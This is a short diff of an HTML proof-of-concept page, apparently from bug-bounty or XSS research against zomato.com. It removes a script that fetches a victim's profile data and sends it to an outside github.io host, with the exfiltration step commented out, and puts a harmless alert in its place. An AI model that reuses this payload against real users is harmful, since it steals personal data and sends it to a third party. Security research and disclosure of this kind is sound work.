@@ -2,15 +2,7 @@
 <html>
 <body>
 <script>
-(async () => {
-  // Step A: Fetch victim PII (same-origin request)
-  const r = await fetch("https://www.zomato.com/webroutes/getPage?page_url=/profile");
-  const data = await r.text();
-  location.href = "https://meme-bb.github.io/#DATA_HERE";
-  // Step B: Exfiltrate to attacker
-  //new Image().src =
-    //"https://meme-bb.github.io/collect?d=" + encodeURIComponent(data);
-})();
+alert("JS_EXECUTED");
 </script>
 </body>
 </html>
